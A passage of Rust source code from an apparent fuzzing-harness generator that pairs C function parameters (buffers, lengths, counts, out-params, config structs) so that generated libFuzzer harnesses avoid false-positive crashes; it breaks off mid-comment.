        // order: `(input_size, const input_buffer, output_size*, output_buffer)`.
        // BrotliDecoderDecompress is the representative case. Treating those
        // four values independently makes the input length a tiny fuzz-derived
        // prefix and initializes the output size to the input size instead of
        // the allocated output capacity, leaving much of the decoder
        // unreachable compared with an expert harness.
        if i + 1 < params.len()
            && is_length_param(&params[i].c_type)
            && is_raw_buffer_param(&params[i + 1].c_type, registry)
            && looks_like_reverse_input_length_buffer_pair(&params[i], &params[i + 1])
        {
            let (len_decl, buf_decl) = pair_input_length_buffer(&params[i], &params[i + 1]);
            out.push(len_decl);
            out.push(buf_decl);
            i += 2;
            pair_consumed = true;
            continue;
        }
        if i + 1 < params.len()
            && is_length_pointer_param(&params[i].c_type)
            && is_output_buffer_param(&params[i + 1].c_type, registry)
            && looks_like_reverse_output_length_buffer_pair(
                &params[i],
                &params[i + 1],
                function_name,
            )
        {
            let (len_decl, buf_decl) =
                pair_output_length_buffer(&params[i], &params[i + 1], function_name);
            out.push(len_decl);
            out.push(buf_decl);
            i += 2;
            continue;
        }
        // Two adjacent pointers that BRACKET one buffer (`const char *ptr,
        // const char *end`). Expat's scanners and `matchkey(start, end, key)`
        // walk `for (; start != end; start++)`. Decoding them as two independent
        // allocations makes that walk run off one heap block toward an unrelated
        // address, which ASan reports as a heap-buffer-overflow in correct
        // library code — measured as false findings on libexpat. Bind both ends
        // to the same libFuzzer span.
        if i + 1 < params.len() && is_begin_end_pointer_pair(&params[i], &params[i + 1]) {
            let (begin_decl, end_decl) = pair_begin_end_span(&params[i], &params[i + 1]);
            out.push(begin_decl);
            out.push(end_decl);
            i += 2;
            pair_consumed = true;
            continue;
        }
        if i + 1 < params.len()
            && is_output_buffer_param(&params[i].c_type, registry)
            && is_length_pointer_param(&params[i + 1].c_type)
        {
            let (buf_decl, len_decl) =
                pair_output_buffer_length(&params[i], &params[i + 1], function_name);
            out.push(buf_decl);
            out.push(len_decl);
            i += 2;
            continue;
        }
        // An untrusted INPUT buffer paired with a length POINTER (`mz_uncompress2`'s
        // `const unsigned char *pSource, mz_ulong *pSource_len`, where `*pSource_len`
        // is the source length the callee reads). Bind `*length` to the actual
        // buffer size; fuzzing it independently lets `*length` exceed the buffer so
        // the callee reads past it — a spurious heap-buffer-overflow that is a
        // harness artifact, not a real bug. The output-buffer arm above already
        // claimed any non-const (writable) buffer, so this is the const-input case.
        //
        // Gate on the pointer param's NAME looking like a length (as the count /
        // typed-array arms do): a trailing `int *` is just as often an out-param
        // error/status flag (`te_interp(const char *expr, int *error)`,
        // `strtol`-style `int *err`) as a length. Mis-pairing those bound `*error`
        // to Size AND passed the `const char *` buffer as the RAW, non-NUL-terminated
        // `Data` span — so a C-string parser (te_interp -> next_token) read past the
        // buffer end, a systematic heap-buffer-overflow FALSE POSITIVE. Without the
        // pair, the string falls through to the NUL-terminating `gf_c_string` decoder.
        if !pair_consumed
            && i + 1 < params.len()
            && is_raw_buffer_param(&params[i].c_type, registry)
            && is_length_pointer_param(&params[i + 1].c_type)
            && looks_like_count_name(&params[i + 1].name)
        {
            let (buf_decl, len_decl) = pair_input_buffer_length_pointer(&params[i], &params[i + 1]);
            out.push(buf_decl);
            out.push(len_decl);
            i += 2;
            pair_consumed = true;
            continue;
        }
        if i + 1 < params.len()
            && is_output_buffer_param(&params[i].c_type, registry)
            && is_length_param(&params[i + 1].c_type)
            && looks_like_output_capacity_pair(&params[i], &params[i + 1], function_name)
        {
            let (buf_decl, len_decl) =
                pair_output_buffer_capacity(&params[i], &params[i + 1], function_name);
            out.push(buf_decl);
            out.push(len_decl);
            i += 2;
            continue;
        }
        if !pair_consumed
            && i + 1 < params.len()
            && is_raw_buffer_param(&params[i].c_type, registry)
            && (is_length_param(&params[i + 1].c_type)
                || (registry_resolves_to_length(&params[i + 1].c_type, registry)
                    && looks_like_count_name(&params[i + 1].name)))
            // Require NAME evidence before binding (buffer, Size): either the
            // trailing int is count-shaped OR the pointer is buffer-shaped.
            // Without this, `(const char *file, int line)` mis-paired as
            // (buffer, length) — a heap-buffer-overflow false positive (log_log).
            && (looks_like_count_name(&params[i + 1].name)
                || looks_like_buffer_name(&params[i].name)
                || (is_synthetic_param_name(&params[i].name)
                    && is_synthetic_param_name(&params[i + 1].name)
                    && (looks_like_explicit_binary_pointer(&params[i].c_type)
                        || looks_like_in_memory_input_function(function_name))))
        {
            let (buf_decl, len_decl) =
                pair_buffer_length(&params[i], &params[i + 1], nul_terminate_input_buffers);
            out.push(buf_decl);
            out.push(len_decl);
            i += 2;
            pair_consumed = true;
            continue;
        }
        // A plural file-path vector is NULL-terminated, not paired with the
        // following scalar. libarchive's
        // `archive_read_open_filenames(a, filenames, block_size)` exposed both
        // failure modes of treating it as `(string_array, count)`: `block_size`
        // was replaced with the number of strings, and a full N-element array
        // had no N+1 NULL sentinel for the callee's walk. Model the expert setup
        // directly: one real temp file containing the complete fuzz input and a
        // terminating NULL. The following block size remains independently
        // decoded as the API intends.
        if crate::c_decoders::is_file_io_function_name(function_name)
            && looks_like_plural_file_path_name(&params[i].name)
        {
            if let Some(paths) = file_path_array_param(&params[i]) {
                out.push(paths);
                i += 1;
                continue;
            }
        }
        // Array of C-strings + element count (cJSON `cJSON_CreateStringArray(const
        // char *const *strings, int count)`). A bare `char **` decoder hands the
        // callee a ONE-element string cursor while `count` is fuzzed independently,
        // so the callee reads `strings[1..count]` out of bounds — a spurious
        // overflow. Allocate `count` decoded strings so the array and its length
        // agree. (Draws the count from the cursor, so not gated by `pair_consumed`.)
        if i + 1 < params.len()
            && crate::c_decoders::char_double_pointer_constness(&params[i].c_type).is_some()
            && (is_length_param(&params[i + 1].c_type)
                || (registry_resolves_to_length(&params[i + 1].c_type, registry)
                    && looks_like_count_name(&params[i + 1].name)))
        {
            let (arr_decl, count_decl) = pair_string_array_count(&params[i], &params[i + 1]);
            out.push(arr_decl);
            out.push(count_decl);
            i += 2;
            continue;
        }
        // The same typed-array/count contract appears in reverse order in
        // POSIX-style APIs (`size_t nmatch, regmatch_t *pmatch`). A scalar count
        // decoded independently from a one-element struct scratch lets the
        // callee write `pmatch[1..nmatch]` out of bounds. Declare the backing
        // array alongside the count while preserving argument order.
        if i + 1 < params.len()
            && is_length_param(&params[i].c_type)
            && looks_like_count_name(&params[i].name)
            && is_typed_array_pointer(&params[i + 1].c_type, registry)
        {
            let (count_decl, arr_decl) = pair_reverse_typed_array_count(&params[i], &params[i + 1]);
            out.push(count_decl);
            out.push(arr_decl);
            i += 2;
            continue;
        }
        // Typed-element array + element count (jsmn's `jsmntok_t *tokens,
        // num_tokens`; `T *items, size_t n`). The byte-buffer pairs above only
        // catch char*/uint8_t* buffers; a non-byte element array synthesised
        // INDEPENDENTLY of its count hands the callee a 1-element fabricated array
        // with a huge fuzzed count, so it indexes far out of bounds — a spurious
        // heap/stack-buffer-overflow that is an isolation artifact, not a real bug
        // (libde265 printBlk, cgltf's bundled jsmn_parse). Allocate `count`
        // elements so the array and its length agree; only a real off-by-one
        // survives. (Draws the count from the cursor, not Data/Size, so it is not
        // gated by `pair_consumed`.)
        if i + 1 < params.len()
            && is_typed_array_pointer(&params[i].c_type, registry)
            && (is_length_param(&params[i + 1].c_type)
                || registry_resolves_to_length(&params[i + 1].c_type, registry))
            && looks_like_count_name(&params[i + 1].name)
        {
            let (arr_decl, count_decl) = pair_typed_array_count(&params[i], &params[i + 1]);
            out.push(arr_decl);
            out.push(count_decl);
            i += 2;
            continue;
        }
        // Out-param of a parser: a `T **` OUTPUT HANDLE (the callee heap-allocates
        // a `T` and stores its pointer at `*out` — `cgltf_parse(..., cgltf_data
        // **out_data)`) gets a NULL scratch pointer passed by address; a `T *`
        // out-param struct gets a zeroed scratch. Either way it consumes no cursor,
        // so the whole input feeds the buffer (instead of fabricating it and
        // starving the parser, or being rejected as not-drivable).
        if has_raw_buffer_pair {
            if let Some(scratch) =
                out_param_handle_scratch(&params[i].c_type, &params[i].name, registry, lifecycle)
            {
                out.push(scratch);
                i += 1;
                continue;
            }
            if let Some(scratch) =
                out_param_struct_scratch(&params[i].c_type, &params[i].name, registry, lifecycle)
            {
                out.push(scratch);
                i += 1;
                continue;
            }
            if let Some(scratch) =
                parser_config_struct_scratch(&params[i].c_type, &params[i].name, registry)
            {
                out.push(scratch);
                i += 1;
                continue;
            }
        }
        // An in-memory parser commonly accepts optional metadata after its
        // canonical `(buffer, length)` pair: a base URL/URI and an explicit
        // character encoding. Maintained callers pass NULL to request automatic
        // detection/default resolution. Fabricating a non-NULL random string is
        // not extra input coverage; it forces nearly every execution through an
        // invalid-encoding or malformed-base early exit (xmlReadMemory is the
        // representative shape). Restrict this to a parser that already consumed
        // a real buffer/length pair, so a standalone URL/encoding API remains
        // fuzzable.
        if pair_consumed
            && looks_like_in_memory_input_function(function_name)
            && is_nullable_memory_metadata_param(&params[i])
        {
            let ty = emit_c_type(&params[i].c_type);
            out.push(CParamEmission {
                support: None,
                decl: format!("{ty} {} = NULL", params[i].name),
                arg: params[i].name.clone(),
                c_type: ty,
                free: None,
            });
            i += 1;
            continue;
        }
        // A printf-style FORMAT parameter of a VARIADIC function: the last fixed
        // `char *` immediately before the `...` (the parser drops the ellipsis but
        // records `variadic`). The harness passes no matching varargs, so a fuzzed
        // `%s`/`%n` would make vfprintf read a garbage vararg and crash — a harness
        // format/argument mismatch FALSE POSITIVE (log.c log_log). Neutralise its
        // specifiers with gf_c_format_string. This complements the NAME-based
        // (fmt/format) detection in select_c_decoder, catching custom loggers like
        // `void my_log(const char *message, ...)`. Conservative: only the final
        // parameter, only a plain `char *`, and never a file-PATH-named one (which
        // keeps its temp-file driver).
        if variadic
            && i + 1 == params.len()
            && crate::c_decoders::is_plain_char_ptr_type(&params[i].c_type)
            && !crate::c_decoders::is_file_path_param_name(&params[i].name)
        {
            let is_const = params[i].c_type.trim_start().starts_with("const")
                || params[i].c_type.contains("char const");
            out.push(crate::c_decoders::c_format_string_param(
                &params[i].name,
                is_const,
            ));
            i += 1;
            continue;
        }
        // Campaign #25: a file-LOADER's path string (pugixml `load_file(const char
        // *path_)`) — placed AFTER the (buffer, length) pairing so a `(source, len)`
        // in-band buffer still pairs, but a LONE path/path_/source/uri string in a
        // file-loader is driven via a tempfile whose CONTENT is the fuzz input.
        if crate::c_decoders::is_file_io_function_name(function_name)
            && crate::c_decoders::is_plain_char_ptr_type(&params[i].c_type)
            && crate::c_decoders::is_loader_file_path_param_name(&params[i].name)
        {
            let is_const = params[i].c_type.trim_start().starts_with("const")
                || params[i].c_type.contains("char const");
            out.push(crate::c_decoders::file_path_param(
                &params[i].name,
                is_const,
            ));
            i += 1;
            continue;
        }
        // Campaign #9: an unpaired integer in/out pointer (index/cursor) in a
        // function that also takes a raw byte buffer is pinned to 0 — see
        // `integer_index_out_pointer`. Placed AFTER the (buffer, length-pointer)
        // pairing arms so a genuine length output pointer still pairs first.
        if has_byte_buffer {
            if let Some(scratch) = integer_index_out_pointer(&params[i].c_type, &params[i].name) {
                out.push(scratch);
                i += 1;
                continue;
            }
        }
        let emission = match header_complete {
            // The C `auto` path supplies a header-completeness oracle so an opaque
            // handle whose struct is defined only in a non-included `.c`
            // (tidwall/hashmap.c) is skipped instead of stack-allocated as an
            // incomplete type (GAP #6). The permissive variant keeps the legacy
            // behavior for callers that pass none (e.g. the sequence path).
            Some(hc) => select_c_decoder_with_lifecycle_strict_with_limits(
                &params[i].c_type,
                &params[i].name,
                registry,
                lifecycle,
                hc,
                limits,
            ),
            None => select_c_decoder_with_lifecycle_with_limits(
                &params[i].c_type,
                &params[i].name,
                registry,
                lifecycle,
                limits,
            ),
        }
        .or_else(|err| {
            if force {
                Ok(crate::c_decoders::best_effort_param_emission(
                    &params[i].c_type,
                    &params[i].name,
                ))
            } else {
                Err(HarnessGenError::UnsupportedParamType(format!(
                    "C parameter '{}' of type '{}' has no byte-buffer decoder \
                     after struct synthesis: {err}",
                    params[i].name, params[i].c_type,
                )))
            }
        })?;
        out.push(emission);
        i += 1;
    }
    Ok(out)
}

/// A non-const pointer to a concrete (declarable) struct/union, in a function
/// that also takes an untrusted `(buffer, length)` pair, is the parser's OUTPUT
/// handle: the callee overwrites it by parsing the buffer
/// (`drwav_init_memory(drwav *pWav, const void *data, size_t n)`,
/// `qoa_decode(const unsigned char *bytes, int size, qoa_desc *file)`).
/// Fabricating it field-by-field from the fuzz cursor is wrong twice over: it
/// spends the input on a struct the callee immediately overwrites — starving the
/// buffer, the real attack surface, so the parser only ever sees garbage and
/// bounces off its magic check (drwav fuzzed at 10 edges) — and risks a false
/// crash from a fuzzed field that survives init. Provide a zeroed scratch
/// instance instead; it consumes NO cursor, so the whole input feeds the buffer.
///
/// Conservative: only a non-const pointee (a `const` struct* is a genuine input
/// the callee reads) that resolves to a concrete struct/union (so it can be
/// stack-declared and `sizeof`'d). Opaque/forward-declared types fall through to
/// the normal lifecycle path.
/// A `T **` OUTPUT-HANDLE parameter of a parser (`cgltf_parse(..., cgltf_data
/// **out_data)`): the callee heap-allocates a `T` and stores its pointer at
/// `*out`. Provide a NULL `T *` scratch and pass its address — consumes no fuzz
/// cursor so the whole input feeds the buffer. Without this the `T **` was
/// rejected as "not safely drivable", so the canonical `parse(data, size, T
/// **out)` entry point (the REAL parser) could not be auto-harnessed at all.
/// Conservative: only a non-const pointer whose pointee is itself a pointer.
fn out_param_handle_scratch(
    c_type: &str,
    name: &str,
    registry: &TypeRegistry,
    lifecycle: &[CHandleLifecycle],
) -> Option<CParamEmission> {
    let canonical = canonical_c_type(c_type);
    if canonical
        .split_whitespace()
        .any(|t| t == "const" || t == "volatile")
    {
        return None;
    }
    let inner_ptr = registry.pointer_base_spelling(c_type)?;
    let inner_ptr = inner_ptr.trim();
    if !inner_ptr.ends_with('*') {
        return None; // pointee is not itself a pointer -> not a `T **`
    }
    let local = format!("_gf_out_{name}");
    // The callee heap-allocates a `T` and stores its pointer at `*out`. If a
    // paired deallocator for `T` is known — discovered CLI-side from the headers
    // and carried as a delete-only lifecycle entry for the handle type — free the
    // result after the call. Without it, the out-param analog of an unfreed
    // return value leaks on EVERY valid input (a successful parse), flooding a
    // CWE-401 false positive for the canonical `parse(data, size, T **out)` shape.
    // Guarded by `if (local)`: the scratch stays NULL when the parse fails, and
    // not every deallocator is NULL-safe.
    let inner_base =
        crate::c_decoders::normalize_handle_key(inner_ptr.trim_end_matches('*').trim());
    let free = lifecycle
        .iter()
        .find(|h| crate::c_decoders::normalize_handle_key(&h.handle_type) == inner_base)
        .and_then(|h| h.delete.as_deref())
        .map(|del| format!("if ({local}) {del}({local})"));
    Some(CParamEmission {
        support: None,
        decl: format!("{inner_ptr} {local} = 0"),
        arg: format!("&{local}"),
        c_type: format!("{inner_ptr} *"),
        free,
    })
}

/// Whether a resolved struct/union `shape` contains a function-pointer field
/// (directly, in an array, or in a nested struct/union). Such a struct must not
/// be zero-memset as a scratch argument — NULL function pointers the callee
/// dispatches through cause a self-inflicted NULL-deref false positive
/// (libcbor `cbor_callbacks`). Depth-bounded to stay total on recursive types.
fn struct_has_fn_pointer_field(shape: &TypeShape, registry: &TypeRegistry, depth: usize) -> bool {
    if depth > 8 {
        return false;
    }
    let fields = match shape {
        TypeShape::Struct { fields, .. } | TypeShape::Union { fields, .. } => fields,
        _ => return false,
    };
    fields
        .iter()
        .any(|f| field_shape_has_fn_pointer(&f.shape, registry, depth))
}

fn field_shape_has_fn_pointer(shape: &TypeShape, registry: &TypeRegistry, depth: usize) -> bool {
    match shape {
        TypeShape::FuncPtr => true,
        TypeShape::Array { elem, .. } => field_shape_has_fn_pointer(elem, registry, depth + 1),
        TypeShape::Struct { .. } | TypeShape::Union { .. } => {
            struct_has_fn_pointer_field(shape, registry, depth + 1)
        }
        _ => false,
    }
}

fn out_param_struct_scratch(
    c_type: &str,
    name: &str,
    registry: &TypeRegistry,
    lifecycle: &[CHandleLifecycle],
) -> Option<CParamEmission> {
    let canonical = canonical_c_type(c_type);
    // A const/volatile pointee is read by the callee — never zero it out.
    if canonical
        .split_whitespace()
        .any(|t| t == "const" || t == "volatile")
    {
        return None;
    }
    let base = registry.pointer_base_spelling(c_type)?;
    let base = base.trim();
    let shape = registry.resolve(base);
    if !matches!(shape, TypeShape::Struct { .. } | TypeShape::Union { .. }) {
        return None;
    }
    // Campaign fix: a struct/union carrying function-pointer fields (libcbor
    // cbor_callbacks) must NOT be zero-memset — that leaves NULL fn pointers the
    // callee dispatches through (a self-inflicted NULL-deref FP). Fall through to
    // the struct-field decoder, which synthesizes no-op trampolines for them.
    if struct_has_fn_pointer_field(&shape, registry, 0) {
        return None;
    }
    let local = format!("_gf_out_{name}");
    let key = crate::c_decoders::normalize_handle_key(base);
    let object_lifecycle = lifecycle.iter().find(|entry| {
        !entry.init_returns_handle
            && crate::c_decoders::normalize_handle_key(&entry.handle_type) == key
    });
    let decl = match object_lifecycle.and_then(|entry| entry.init.as_deref()) {
        Some(init) => {
            format!("{base} {local}; memset(&{local}, 0, sizeof {local}); (void){init}(&{local})")
        }
        None => format!("{base} {local}; memset(&{local}, 0, sizeof {local})"),
    };
    // An explicitly initialized in-place object remains valid for destruction
    // even when the parser reports malformed input. This is the ordinary
    // `result_init(&r); parse(&r,...); result_destroy(&r)` contract used by
    // msgpack and similar APIs.
    let free = object_lifecycle
        .filter(|entry| entry.init.is_some())
        .and_then(|entry| entry.delete.as_deref())
        .map(|delete| format!("{delete}(&{local})"));
    Some(CParamEmission {
        support: None,
        decl,
        arg: format!("&{local}"),
        c_type: format!("{base} *"),
        free,
    })
}

/// A parser's CONFIG / options struct (`const cgltf_options *`) sitting beside a
/// `(data, size)` buffer pair: the attack surface is the DATA buffer, not the
/// caller's configuration, so feed library defaults (a zeroed struct) instead of
/// fabricating the config from fuzz bytes. Fuzzing the config invents states no
/// caller produces — a fuzzed `cgltf_options.json_token_count` made `cgltf_parse`
/// allocate ~55 GB (`sizeof(jsmntok_t) * json_token_count`, CWE-789) before a
/// single byte of glTF was parsed: a harness artifact reported "critical", not a
/// target bug. Mirrors [`out_param_struct_scratch`] but accepts the const-qualified
/// config (still only a concrete, declarable struct/union pointee). Gated to
/// `has_raw_buffer_pair` callers so a genuine standalone struct input — one with no
/// adjacent byte buffer to be the attack surface — is still decoded normally.
fn parser_config_struct_scratch(
    c_type: &str,
    name: &str,
    registry: &TypeRegistry,
) -> Option<CParamEmission> {
    let canonical = canonical_c_type(c_type);
    // A volatile pointee is genuine aliased I/O — leave it to normal decoding.
    if canonical.split_whitespace().any(|t| t == "volatile") {
        return None;
    }
    let base = registry.pointer_base_spelling(c_type)?;
    let base = strip_cv_tokens(base.trim());
    let base = base.trim();
    if base.is_empty() {
        return None;
    }
    let shape = registry.resolve(base);
    if !matches!(shape, TypeShape::Struct { .. } | TypeShape::Union { .. }) {
        return None;
    }
    // Campaign fix (see out_param_struct_scratch): never zero-memset a callback /
    // vtable struct — NULL fn pointers cause a self-inflicted NULL-deref FP.
    if struct_has_fn_pointer_field(&shape, registry, 0) {
        return None;
    }
    let local = format!("_gf_cfg_{name}");
    Some(CParamEmission {
        support: None,
        decl: format!("{base} {local}; memset(&{local}, 0, sizeof {local})"),
        arg: format!("&{local}"),
        c_type: format!("{base} *"),
        free: None,
    })
}

/// Drop `const`/`volatile` cv-qualifier tokens wherever they appear, so EAST-const
/// (`void const *`, `char const *`) is recognised the same as WEST-const
/// (`const void *`). Without this, an East-const buffer param fails the byte-buffer
/// check, the `(buffer, length)` pair is NOT coalesced, and `length` is fuzzed
/// INDEPENDENTLY of the buffer — handing the callee a real buffer with a much
/// larger fuzzed size, a spurious out-of-bounds read (id3tag's
/// `id3tag_load(void const* data, size_t size, ...)` read 16k from a 23-byte input).
fn strip_cv_tokens(canonical: &str) -> String {
    canonical
        .split_whitespace()
        .filter(|t| *t != "const" && *t != "volatile")
        .collect::<Vec<_>>()
        .join(" ")
}

fn is_raw_buffer_param(c_type: &str, registry: &TypeRegistry) -> bool {
    let canonical = canonical_c_type(c_type);
    let without_const = strip_cv_tokens(&canonical);
    pointer_base(&without_const).is_some_and(is_byte_buffer_base)
        || registry_resolves_to_byte_pointer(c_type, registry)
}

/// Campaign #9: an integer in/out pointer that the callee uses as an index/cursor
/// to walk a sibling byte buffer (qoi_read_32's `int *p`, used as `bytes[(*p)++]`).
/// Fuzzing `*p` full-range against the Size-bounded buffer is a guaranteed heap-OOB
/// on short/0-byte input — the real caller seeds a valid offset (typically 0). Pin
/// the storage to 0; a pure out-param the callee overwrites is equally correct.
/// Only a single-level NON-const pointer to a NON-byte integer scalar: a byte/char
/// pointer is a buffer/string handled elsewhere, and a `const` pointer is a
/// read-only input array left to the standard decoder.
fn integer_index_out_pointer(c_type: &str, name: &str) -> Option<CParamEmission> {
    let canonical = canonical_c_type(c_type);
    if is_const_pointer_type(&canonical) {
        return None;
    }
    let base = pointer_base(&canonical)?;
    if !is_nonbyte_integer_scalar_base(base) {
        return None;
    }
    let storage = format!("_gf_out_{name}");
    Some(CParamEmission {
        support: None,
        decl: format!("{base} {storage} = ({base})0; {base} *{name} = &{storage}"),
        arg: name.to_owned(),
        c_type: format!("{base} *"),
        free: None,
    })
}

/// An integer scalar base that is NOT a byte/char (those are buffers/strings). The
/// set mirrors `out_pointer_decoder`'s recognised integer bases minus the byte
/// kinds, so an index/cursor out-pointer is recognised but a `char *`/`uint8_t *`
/// buffer is not.
fn is_nonbyte_integer_scalar_base(base: &str) -> bool {
    matches!(
        base,
        "int"
            | "signed int"
            | "unsigned"
            | "unsigned int"
            | "long"
            | "signed long"
            | "unsigned long"
            | "long long"
            | "signed long long"
            | "unsigned long long"
            | "size_t"
            | "ssize_t"
            | "short"
            | "signed short"
            | "unsigned short"
            | "int16_t"
            | "uint16_t"
            | "int32_t"
            | "uint32_t"
            | "int64_t"
            | "uint64_t"
    )
}

fn is_output_buffer_param(c_type: &str, registry: &TypeRegistry) -> bool {
    let canonical = canonical_c_type(c_type);
    if is_const_pointer_type(&canonical) {
        return false;
    }
    pointer_base(&canonical).is_some_and(is_byte_buffer_base)
        || registry_resolves_to_byte_pointer(c_type, registry)
}

fn is_length_param(c_type: &str) -> bool {
    // Conservative: only count `size_t`, `ssize_t`, plain `int`, `unsigned`,
    // `long`, `unsigned long` as length-shaped neighbors. Fixed-width ints
    // like `uint32_t` are often flag bitmaps, not lengths - leave them to the
    // standalone decoder.
    let canonical = canonical_c_type(c_type);
    let without_const = canonical.trim_start_matches("const ").trim();
    is_length_scalar_base(without_const)
}

fn is_length_pointer_param(c_type: &str) -> bool {
    let canonical = canonical_c_type(c_type);
    if canonical.starts_with("const ") {
        return false;
    }
    pointer_base(&canonical).is_some_and(is_length_scalar_base)
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
enum ByteDoublePointerKind {
    Input,
    Output,
}

fn byte_double_pointer_kind(c_type: &str) -> Option<ByteDoublePointerKind> {
    let canonical = canonical_c_type(c_type);
    let stars = canonical
        .split_whitespace()
        .filter(|token| *token == "*")
        .count();
    if stars != 2 {
        return None;
    }
    let tokens: Vec<&str> = canonical
        .split_whitespace()
        .filter(|token| *token != "*" && *token != "const" && *token != "volatile")
        .collect();
    let base = tokens.join(" ");
    if !is_byte_buffer_base(&base) || base == "void" {
        return None;
    }
    if canonical.split_whitespace().any(|token| token == "const") {
        Some(ByteDoublePointerKind::Input)
    } else {
        Some(ByteDoublePointerKind::Output)
    }
}

fn looks_like_stream_count_cursor_pair(length: &CParameter, cursor: &CParameter) -> bool {
    let len = length.name.to_ascii_lowercase();
    let ptr = cursor.name.to_ascii_lowercase();
    let count_shape = len.contains("avail")
        || len.contains("remain")
        || len.contains("size")
        || len.contains("length")
        || len.contains("count");
    let cursor_shape = ptr.contains("next")
        || ptr.contains("cursor")
        || ptr.contains("input")
        || ptr.contains("output")
        || ptr.ends_with("_in")
        || ptr.ends_with("_out");
    count_shape && cursor_shape
}

fn pair_stream_count_byte_cursor(
    length: &CParameter,
    cursor: &CParameter,
) -> (CParamEmission, CParamEmission) {
    let kind =
        byte_double_pointer_kind(&cursor.c_type).expect("caller checked byte double-pointer shape");
    let len_type = emit_c_type(&length.c_type);
    let len_base = pointer_base(&canonical_c_type(&length.c_type))
        .expect("caller checked length pointer")
        .to_owned();
    let len_name = &length.name;
    let cursor_type = canonical_c_type(&cursor.c_type);
    let cursor_name = &cursor.name;
    let len_storage = format!("_gf_stream_{len_name}");

    match kind {
        ByteDoublePointerKind::Input => {
            let inner_type = cursor_type
                .strip_suffix(" *")
                .expect("double pointer has outer star")
                .trim();
            let ptr_storage = format!("_gf_stream_{cursor_name}");
            let len_emission = CParamEmission {
                support: None,
                decl: format!(
                    "{len_base} {len_storage} = ({len_base})Size; {len_type} {len_name} = &{len_storage}"
                ),
                arg: len_name.to_owned(),
                c_type: len_type,
                free: None,
            };
            let cursor_emission = CParamEmission {
                support: None,
                decl: format!(
                    "{inner_type} {ptr_storage} = ({inner_type})Data; {cursor_type} {cursor_name} = &{ptr_storage}"
                ),
                arg: cursor_name.to_owned(),
                c_type: cursor_type,
                free: None,
            };
            (len_emission, cursor_emission)
        }
        ByteDoublePointerKind::Output => {
            let inner_type = cursor_type
                .strip_suffix(" *")
                .expect("double pointer has outer star")
                .trim();
            let cap = format!("_gf_cap_{cursor_name}");
            let buffer = format!("_gf_buf_{cursor_name}");
            let ptr_storage = format!("_gf_stream_{cursor_name}");
            let len_emission = CParamEmission {
                support: None,
                decl: format!(
                    "size_t {cap} = Size <= (1024 * 1024) ? (size_t)Size + 65536 : (1024 * 1024 + 65536); \
                     {inner_type} {buffer} = ({inner_type})malloc({cap} ? {cap} : 1); \
                     {len_base} {len_storage} = ({len_base})({buffer} ? {cap} : 0); {len_type} {len_name} = &{len_storage}"
                ),
                arg: len_name.to_owned(),
                c_type: len_type,
                free: None,
            };
            let cursor_emission = CParamEmission {
                support: None,
                decl: format!(
                    "{inner_type} {ptr_storage} = {buffer}; {cursor_type} {cursor_name} = &{ptr_storage}"
                ),
                arg: cursor_name.to_owned(),
                c_type: cursor_type,
                free: Some(format!("free({buffer})")),
            };
            (len_emission, cursor_emission)
        }
    }
}

fn is_byte_buffer_base(base: &str) -> bool {
    matches!(
        base,
        "char" | "uint8_t" | "unsigned char" | "void" | "int8_t" | "Bytef" | "Byte"
    )
}

fn registry_resolves_to_byte_pointer(c_type: &str, registry: &TypeRegistry) -> bool {
    matches!(
        registry.resolve(c_type),
        TypeShape::Pointer(inner)
            if matches!(*inner, TypeShape::Scalar(ScalarKind::U8 | ScalarKind::I8))
    )
}

/// True when `c_type` resolves (through project typedefs) to an integer scalar of
/// length/count shape (`size_t`, `cgltf_size`, ...). The name-based
/// [`is_length_param`] misses project size typedefs (`cgltf_size` -> `size_t`),
/// so a (typed output array, count) pair went undetected: the array was sized to
/// ONE element while the count was fuzzed huge — a spurious stack-buffer-overflow
/// (`cgltf_element_read_float` wrote `element_size` floats into a 1-float `out`).
fn registry_resolves_to_length(c_type: &str, registry: &TypeRegistry) -> bool {
    matches!(
        registry.resolve(c_type),
        TypeShape::Scalar(
            ScalarKind::I16
                | ScalarKind::U16
                | ScalarKind::I32
                | ScalarKind::U32
                | ScalarKind::I64
                | ScalarKind::U64
        )
    )
}

/// A pointer to a COMPLETE, non-byte element type (`jsmntok_t *`, `int32_t *`,
/// `float *`) — i.e. an ARRAY of elements, distinct from a byte buffer (handled
/// by is_raw_buffer_param) and from a `T **` output slot. Pairs with a trailing
/// element-count param: synthesising the pointer and the count INDEPENDENTLY
/// hands the callee a 1-element fabricated array with a huge fuzzed count, so it
/// indexes far out of bounds — a spurious heap/stack-buffer-overflow that is an
/// isolation artifact, not a real bug (jsmn_parse's `jsmntok_t *tokens,
/// num_tokens`; libde265 printBlk). The element must be a known aggregate or a
/// non-byte scalar so `calloc(count, sizeof(*p))` is sound; an opaque/forward
/// handle or `T **` falls through to the standalone decoder.
fn is_typed_array_pointer(c_type: &str, registry: &TypeRegistry) -> bool {
    match registry.resolve(c_type) {
        TypeShape::Pointer(inner) => match *inner {
            TypeShape::Struct { .. } | TypeShape::Union { .. } | TypeShape::Enum { .. } => true,
            // Numeric-element array, but NOT a byte buffer (that is the raw-buffer
            // case) and NOT a NUL-terminated string.
            TypeShape::Scalar(k) => !matches!(k, ScalarKind::U8 | ScalarKind::I8),
            _ => false,
        },
        _ => false,
    }
}

/// True when a parameter name reads like an element count for a sibling array
/// (`num_tokens`, `count`, `nmemb`, `n`). Gate for the typed-array pairing so a
/// `(SomeStruct *out, int flags)` signature — pointer followed by a non-count
/// int — is left to the standalone decoders instead of being mis-paired.
pub(crate) fn looks_like_count_name(name: &str) -> bool {
    let n = name.to_ascii_lowercase();
    n == "n"
        || n == "nmatch"
        || [
            "count", "num", "nmemb", "nitem", "ntok", "nelem", "len", "size", "cap", "length",
            // `nbyte`/`nBytes` is a ubiquitous byte-length name (tinyxml2
            // `Parse(const char*, size_t nBytes)`). Deliberately NOT a bare
            // `byte`, so `byteOrder`/`byteOffset`/`byteValue` are not mis-read as
            // a buffer length.
            "nbyte",
        ]
        .iter()
        .any(|marker| n.contains(marker))
}

/// True when a parameter name reads like a data BUFFER (`buf`, `data`, `src`,
/// `input`, ...). Used WITH [`looks_like_count_name`] to gate the raw-buffer +
/// by-value-length pairing: `log_log(int level, const char *file, int line,
/// const char *fmt, ...)` was mis-read as a `(buffer=file, length=line)` pair
/// because `file` is a `char *` and `line` is an `int` — binding `file` to the
/// raw, non-NUL-terminated `Data` span and `line` to `Size`, so the `%s`-printed
/// `file` ran off the end: a spurious heap-buffer-overflow. Neither `file` nor
/// `line` is buffer- or length-shaped, so the pair must NOT form; both fall
/// through to the standalone NUL-terminating string + scalar decoders. A genuine
